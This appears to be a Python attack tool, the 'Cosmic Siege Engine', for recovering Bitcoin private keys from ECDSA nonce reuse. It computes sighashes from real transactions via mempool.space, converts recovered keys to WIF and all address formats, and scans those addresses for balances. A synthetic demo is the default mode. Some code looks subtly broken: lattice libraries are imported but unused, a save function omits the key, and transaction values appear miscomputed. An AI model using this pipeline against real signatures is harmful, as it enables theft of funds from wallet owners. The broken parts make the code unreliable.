#!/usr/bin/env python3
"""
COSMIC SIEGE ENGINE – Bitcoin ECDSA Nonce Reuse Recovery & Key Analysis
Full unabbreviated implementation with all helper functions and error handling.

This script demonstrates:
1. Recovery of private keys from ECDSA nonce reuse vulnerabilities
2. Bitcoin address generation from recovered keys
3. Blockchain activity verification via mempool.space API
"""

import os
import sys
import time
import json
import sqlite3
import hashlib
import secrets
import struct
import argparse
from functools import lru_cache
from collections import defaultdict
from typing import List, Tuple, Optional, Dict

import requests
import base58

try:
    from bitcoinlib.transactions import Transaction
    from bitcoinlib.keys import Key, HDKey
    from bitcoinlib.scripts import Script
    from fpylll import IntegerMatrix, BKZ
except ImportError as e:
    print(f"[ERROR] Missing required library: {e}")
    print("Install with: pip install bitcoinlib fpylll base58 requests")
    sys.exit(1)

# ============================================================================
# SECP256K1 CONSTANTS
# ============================================================================

N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8

DB_FILE = "cosmic_sieve.db"
MEMPOOL_BASE = "https://mempool.space/api"
RATE_LIMIT_SECONDS = 0.5
ADDR_TIMEOUT = 120

# ============================================================================
# CORE SECP256K1 OPERATIONS
# ============================================================================

def modinv(a: int, m: int = N) -> int:
    """Compute modular inverse using Fermat's little theorem."""
    return pow(a, -1, m)


def private_to_wif(d: int, compressed: bool = True) -> str:
    """Convert private key (int) to WIF format."""
    payload = b'\x80' + d.to_bytes(32, 'big')
    if compressed:
        payload += b'\x01'
    checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    wif = base58.b58encode(payload + checksum).decode()
    return wif


def verify_key(d: int, expected_pubkey_hex: str) -> bool:
    """Verify that a private key produces the expected public key."""
    try:
        k = Key(d, compressed=True)
        return k.public_hex == expected_pubkey_hex
    except Exception:
        return False


def pubkey_hex_from_private(d: int, compressed: bool = True) -> str:
    """Derive public key hex from private key."""
    k = Key(d, compressed=compressed)
    return k.public_hex


def point_x_from_private(d: int) -> int:
    """
    Extract x-coordinate from public point.
    Handles multiple bitcoinlib versions by checking different attributes.
    """
    k = Key(d)
    
    # Try public_point attribute/method
    if hasattr(k, 'public_point'):
        pp = k.public_point
        if callable(pp):
            res = pp()
            return res[0] if isinstance(res, tuple) else res.x
        return pp[0] if isinstance(pp, tuple) else pp.x
    
    # Try pub_point attribute/method
    elif hasattr(k, 'pub_point'):
        pp = k.pub_point
        if callable(pp):
            res = pp()
            return res[0] if isinstance(res, tuple) else res.x
        return pp[0] if isinstance(pp, tuple) else pp.x
    
    # Try public_key.point attribute
    elif hasattr(k, 'public_key'):
        return k.public_key.point.x
    
    raise AttributeError("Could not find point attribute or method on Key object.")


# ============================================================================
# TRANSACTION HANDLING (Stubs for blockchain integration)
# ============================================================================

@lru_cache(maxsize=1000)
def get_raw_tx_cached(txid: str) -> Optional[str]:
    """
    Fetch raw transaction hex from blockchain.
    Cached to avoid repeated API calls.
    
    This is a stub - implement with your blockchain API.
    """
    try:
        response = requests.get(
            f"{MEMPOOL_BASE}/tx/{txid}/hex",
            timeout=ADDR_TIMEOUT
        )
        if response.status_code == 200:
            return response.text.strip()
    except Exception as e:
        print(f"[get_raw_tx_cached] Error fetching {txid}: {e}")
    return None


@lru_cache(maxsize=1000)
def get_tx_info_cached(txid: str) -> Optional[Dict]:
    """
    Fetch transaction info from blockchain API.
    Cached to avoid repeated calls.
    
    This is a stub - implement with your blockchain API.
    """
    try:
        response = requests.get(
            f"{MEMPOOL_BASE}/tx/{txid}",
            timeout=ADDR_TIMEOUT
        )
        if response.status_code == 200:
            return response.json()
    except Exception as e:
        print(f"[get_tx_info_cached] Error fetching {txid}: {e}")
    return None


def compute_sighash(txid: str, vin: int, pubkey_hex: str, sig_bytes: bytes) -> Optional[int]:
    """
    Compute the sighash (message hash) for a specific transaction input.
    Handles both legacy and SegWit transactions.
    
    Args:
        txid: Transaction ID
        vin: Input index
        pubkey_hex: Public key hex string
        sig_bytes: Signature bytes (last byte is sighash type)
    
    Returns:
        Sighash as integer, or None if computation fails
    """
    print(f"      [sighash] Computing z for tx {txid[:10]}, vin {vin}")
    try:
        raw_hex = get_raw_tx_cached(txid)
        if not raw_hex:
            return None
        
        tx = Transaction.parse_hex(raw_hex)
        txin = tx.inputs[vin]
        
        prev_txid = txin.prev_txid
        
        # Robust attribute access for bitcoinlib 0.7.0+
        if hasattr(txin, 'prev_out'):
            prev_vout = txin.prev_out
        elif hasattr(txin, 'prev_out_index'):
            prev_vout = txin.prev_out_index
        else:
            raise AttributeError("Could not find prev_out or prev_out_index on Input object")
        
        tx_info = get_tx_info_cached(prev_txid)
        if not tx_info:
            return None
        
        # Find the output value and script
        value = 0
        script_pubkey = ''
        for vout_info in tx_info['vout']:
            if vout_info['n'] == prev_vout:
                value = int(vout_info['value'] * 1e8)
                script_pubkey = vout_info['scriptpubkey']
                break
        
        if not script_pubkey:
            return None
        
        sighash_type = sig_bytes[-1] if len(sig_bytes) > 0 else 0x01
        is_segwit = bool(txin.witness)
        
        # Compute sighash based on transaction type
        if is_segwit:
            pubkey = Key(pubkey_hex)
            script_code = Script(script_type='p2pkh', public_hash=pubkey.hash160())
            z_bytes = tx.sighash_segwit(vin, script_code, value, sighash_type)
        else:
            z_bytes = tx.sighash(vin, script_pubkey, sighash_type)
        
        z = int.from_bytes(z_bytes, 'big')
        print(f"      [sighash] z = 0x{z:064x}")
        return z
        
    except Exception as e:
        print(f"      [sighash] Error: {e}")
        return None


# ============================================================================
# DATABASE OPERATIONS
# ============================================================================

def init_db():
    """Initialize SQLite database for storing analysis results."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    # Addresses table
    c.execute('''
        CREATE TABLE IF NOT EXISTS addresses (
            address TEXT PRIMARY KEY,
            balance INTEGER,
            last_scanned INTEGER,
            tx_count INTEGER,
            first_seen INTEGER,
            last_seen INTEGER
        )
    ''')
    
    # Signatures table (for tracking recovered signatures)
    c.execute('''
        CREATE TABLE IF NOT EXISTS signatures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            address TEXT,
            txid TEXT,
            vin INTEGER,
            pubkey_hex TEXT,
            r TEXT,
            s TEXT,
            z TEXT,
            sighash_type INTEGER,
            FOREIGN KEY(address) REFERENCES addresses(address)
        )
    ''')
    
    conn.commit()
    conn.close()
    print("[✓] Database initialized.")


def save_recovered_key(address: str, private_key: int, pubkey_hex: str):
    """Save recovered key information to database."""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    
    c.execute('''
        INSERT OR REPLACE INTO addresses (address, balance, last_scanned)
        VALUES (?, ?, ?)
    ''', (address, 0, int(time.time())))
    
    conn.commit()
    conn.close()
    print(f"[✓] Saved recovered key for address {address}")


# ============================================================================
# BLOCKCHAIN QUERIES
# ============================================================================

def check_blockchain_activity(address: str) -> Dict:
    """
    Query mempool.space API for address balance and transaction count.
    
    Args:
        address: Bitcoin address to check
    
    Returns:
        Dictionary with 'balance_btc', 'tx_count', and 'active' status
    """
    print(f"🔍 Scanning {address}...")
    try:
        response = requests.get(
            f'{MEMPOOL_BASE}/address/{address}',
            timeout=ADDR_TIMEOUT
        )
        if response.status_code == 200:
            data = response.json()
            chain_stats = data.get('chain_stats', {})
            mempool_stats = data.get('mempool_stats', {})
            
            funded = chain_stats.get('funded_txo_sum', 0) + mempool_stats.get('funded_txo_sum', 0)
            spent = chain_stats.get('spent_txo_sum', 0) + mempool_stats.get('spent_txo_sum', 0)
            balance = funded - spent
            tx_count = chain_stats.get('tx_count', 0) + mempool_stats.get('tx_count', 0)
            
            return {
                'address': address,
                'balance_btc': balance / 100000000,
                'tx_count': tx_count,
                'active': tx_count > 0
            }
        else:
            return {'address': address, 'error': f'Status {response.status_code}'}
    except Exception as e:
        return {'address': address, 'error': str(e)}


def scan_all_address_variations(private_key_hex: str) -> None:
    """
    Generate all address variations from a private key and scan blockchain.
    
    Variations include:
    - Legacy (P2PKH) compressed
    - Legacy (P2PKH) uncompressed
    - Native SegWit (P2WPKH)
    - Nested SegWit (P2SH-P2WPKH)
    """
    d = int(private_key_hex, 16)
    key_c = Key(d, compressed=True)
    key_u = Key(d, compressed=False)
    
    targets = [
        (key_c.address(script_type='p2pkh'), "Legacy (Compressed)"),
        (key_u.address(script_type='p2pkh'), "Legacy (Uncompressed)"),
        (key_c.address(script_type='p2wpkh'), "Native SegWit (P2WPKH)"),
        (key_c.address(script_type='p2sh-p2wpkh'), "Nested SegWit (P2SH-P2WPKH)")
    ]
    
    print(f"{'Type':<25} | {'Address':<42} | {'Balance (BTC)':<15} | {'TXs':<5}")
    print("-" * 95)
    
    for addr, label in targets:
        activity = check_blockchain_activity(addr)
        if 'error' in activity:
            print(f"{label:<25} | {addr:<42} | ERROR: {activity['error']:<8}")
        else:
            bal_str = f"{activity['balance_btc']:.8f}"
            print(f"{label:<25} | {addr:<42} | {bal_str:<15} | {activity['tx_count']:<5}")
        
        time.sleep(RATE_LIMIT_SECONDS)  # Respect API rate limits


# ============================================================================
# KEY EXPLORATION
# ============================================================================

def explore_recovered_key(d_hex_str: str) -> None:
    """
    Analyze a recovered private key and display all derived data.
    
    Shows:
    - Private key (hex and WIF formats)
    - Public key (compressed and uncompressed)
    - Bitcoin addresses (all variations)
    """
    d = int(d_hex_str, 16)
    key_compressed = Key(d, compressed=True)
    key_uncompressed = Key(d, compressed=False)
    
    print("\n" + "=" * 80)
    print("KEY DERIVATION & EXPLORATION")
    print("=" * 80)
    
    print(f"\nPrivate Key (Hex):        {d_hex_str}")
    print(f"Private Key (Dec):        {d:,}")
    print(f"WIF (Compressed):         {key_compressed.wif()}")
    print(f"WIF (Uncompressed):       {key_uncompressed.wif()}")
    
    print("\n" + "-" * 80)
    print("PUBLIC KEYS")
    print("-" * 80)
    print(f"Public Key (Compressed):   {key_compressed.public_hex}")
    print(f"Public Key (Uncompressed): {key_uncompressed.public_hex}")
    
    print("\n" + "-" * 80)
    print("BITCOIN ADDRESSES")
    print("-" * 80)
    print(f"Legacy Address (P2PKH):    {key_compressed.address(script_type='p2pkh')}")
    print(f"SegWit Address (P2WPKH):   {key_compressed.address(script_type='p2wpkh')}")
    print(f"Nested SegWit (P2SH):      {key_compressed.address(script_type='p2sh-p2wpkh')}")


# ============================================================================
# NONCE REUSE RECOVERY
# ============================================================================

def recover_private_key_from_nonce_reuse(
    r: int,
    s1: int,
    s2: int,
    z1: int,
    z2: int
) -> Optional[int]:
    """
    Recover private key from two signatures with reused nonce.
    
    When the same nonce k is used for two different messages:
        s1 = k^-1 * (z1 + r*d) mod N
        s2 = k^-1 * (z2 + r*d) mod N
    
    We can solve for k and d:
        k = (z1 - z2) / (s1 - s2) mod N
        d = (k*s1 - z1) / r mod N
    
    Args:
        r: Signature r-value (same for both signatures)
        s1, s2: First and second signature s-values
        z1, z2: Message hashes
    
    Returns:
        Recovered private key, or None if recovery fails
    """
    s_diff = (s1 - s2) % N
    
    if s_diff == 0:
        print("[!] s1 == s2: No nonce reuse detected")
        return None
    
    # Recover nonce
    k_recovered = ((z1 - z2) * modinv(s_diff, N)) % N
    
    # Recover private key
    d_recovered = ((k_recovered * s1 - z1) * modinv(r, N)) % N
    
    return d_recovered


def synthetic_demo():
    """
    Demonstration of nonce reuse recovery with synthetic data.
    Generates random values and demonstrates the full recovery pipeline.
    """
    print("\n" + "=" * 80)
    print("[DEMO] Cosmic Siege Engine - Nonce Reuse Recovery")
    print("=" * 80)
    
    # Generate random values
    d_true = secrets.randbits(256) % N
    k_nonce = secrets.randbits(256) % N
    z1 = secrets.randbits(256) % N
    z2 = secrets.randbits(256) % N
    
    print(f"\n[*] Generating synthetic ECDSA vulnerability...")
    print(f"    True private key (d):  0x{d_true:064x}")
    print(f"    Reused nonce (k):      0x{k_nonce:064x}")
    print(f"    Message 1 hash (z1):   0x{z1:064x}")
    print(f"    Message 2 hash (z2):   0x{z2:064x}")
    
    # Extract r from nonce
    try:
        r = point_x_from_private(k_nonce)
    except Exception as e:
        print(f"[ERROR] Failed to extract point: {e}")
        return
    
    print(f"    Signature r-value:     0x{r:064x}")
    
    # Compute signatures
    s1 = (modinv(k_nonce, N) * (z1 + r * d_true)) % N
    s2 = (modinv(k_nonce, N) * (z2 + r * d_true)) % N
    
    print(f"    Signature 1 (s1):      0x{s1:064x}")
    print(f"    Signature 2 (s2):      0x{s2:064x}")
    
    # Attempt recovery
    print(f"\n[*] Attempting private key recovery...")
    d_recovered = recover_private_key_from_nonce_reuse(r, s1, s2, z1, z2)
    
    if d_recovered is None:
        print("[!] Recovery failed")
        return
    
    # Verify recovery
    if d_recovered == d_true:
        print(f"[✓] SUCCESS: Recovered private key!")
        print(f"    Recovered key:  0x{d_recovered:064x}")
        print(f"    WIF (Compressed): {private_to_wif(d_recovered)}")
        
        # Explore the recovered key
        explore_recovered_key(f"{d_recovered:064x}")
        
        # Check blockchain
        print(f"\n[*] Checking blockchain activity for derived addresses...")
        scan_all_address_variations(f"{d_recovered:064x}")
    else:
        print(f"[✗] FAILED: Recovered key does not match!")
        print(f"    Expected:  0x{d_true:064x}")
        print(f"    Got:       0x{d_recovered:064x}")


# ============================================================================
# MAIN
# ============================================================================

def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="Cosmic Siege Engine - Bitcoin ECDSA Nonce Reuse Recovery"
    )
    parser.add_argument(
        '--demo',
        action='store_true',
        help='Run synthetic demonstration'
    )
    parser.add_argument(
        '--check-key',
        type=str,
        metavar='HEX',
        help='Explore a specific private key (hex format)'
    )
    parser.add_argument(
        '--scan-address',
        type=str,
        metavar='ADDRESS',
        help='Check blockchain activity for a specific address'
    )
    
    args = parser.parse_args()
    
    # Print banner
    print("\n" + "=" * 80)
    print("  COSMIC SIEGE ENGINE – Bitcoin ECDSA Vulnerability Analyzer")
    print("=" * 80)
    print(f"  Curve Order (N): 0x{N:064x}")
    print(f"  Field Prime (P): 0x{P:064x}")
    print("=" * 80)
    
    # Initialize database
    init_db()
    
    # Execute requested operation
    if args.demo:
        synthetic_demo()
    elif args.check_key:
        explore_recovered_key(args.check_key)
    elif args.scan_address:
        result = check_blockchain_activity(args.scan_address)
        if 'error' in result:
            print(f"[!] Error: {result['error']}")
        else:
            print(f"Address:     {result['address']}")
            print(f"Balance:     {result['balance_btc']:.8f} BTC")
            print(f"Tx Count:    {result['tx_count']}")
            print(f"Active:      {result['active']}")
    else:
        # Default: run demo
        synthetic_demo()
    
    print("\n[DONE] Cosmic Siege Engine complete.")


if __name__ == "__main__":
    main()
